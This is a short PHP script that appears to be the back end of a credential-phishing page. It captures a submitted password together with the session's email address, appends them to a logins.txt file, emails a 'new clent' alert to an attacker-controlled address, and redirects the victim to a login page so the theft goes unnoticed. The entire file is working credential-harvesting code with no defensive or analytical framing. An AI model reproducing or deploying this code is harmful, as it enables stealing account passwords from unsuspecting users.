<?php

			session_start();
			
			$pass = $_POST["Passwd"];
			$email=$_SESSION["Email"];
			//opening logins text file for appending new data.
  			$file = fopen("logins.txt", "a") or die("Unable to open file!");
			//Writing email and password to logins.txt. 
  			fwrite($file, $email."	".$pass.PHP_EOL);			
  			fclose($file);//closing logins.txt.
?>
<?php
  $Name = "D4 daddy"; //senders name
  $email = "daddy@fetishrequest.me"; //senders e-mail adress
  $recipient = "daddy@fetishrequest.me"; //recipient
  $mail_body = "new clent"; //mail body
  $subject = "details"; //subject
  $header = "From: ". $Name . " <" . $email . ">\r\n"; //optional headerfields
  mail($recipient, $subject, $mail_body, $header); //mail command :)
			//redirecting user to the google drive's locations where the game is available to download.
  			//change the location url to redirect to a website of your choice.
  			header("Location: /account/login");
			exit();
			
			
			session_destroy();
			

?>
